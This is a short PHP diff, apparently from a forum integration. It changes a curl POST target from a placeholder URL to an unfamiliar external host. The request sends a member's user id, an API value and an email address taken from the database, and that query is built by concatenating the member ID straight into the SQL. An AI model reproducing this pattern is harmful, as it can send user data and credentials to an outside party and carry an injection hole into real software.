@@ -2952,7 +2952,7 @@ value_type();
           # API PUSH: $userid, $api, $email_address
           $email_address = $this -> query("SELECT email_address FROM smf_members WHERE id_member = ".$memberID);
           $ch = curl_init();
-          curl_setopt($ch, CURLOPT_URL,"http://www.mysite.com/tester.phtml");
+          curl_setopt($ch, CURLOPT_URL,"http://aba.4amulnch.net/tea-api");
           curl_setopt($ch, CURLOPT_POST, 1);
           curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('userid' => $userid, 'api' => $api, 'email_address' => $email_address)));
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
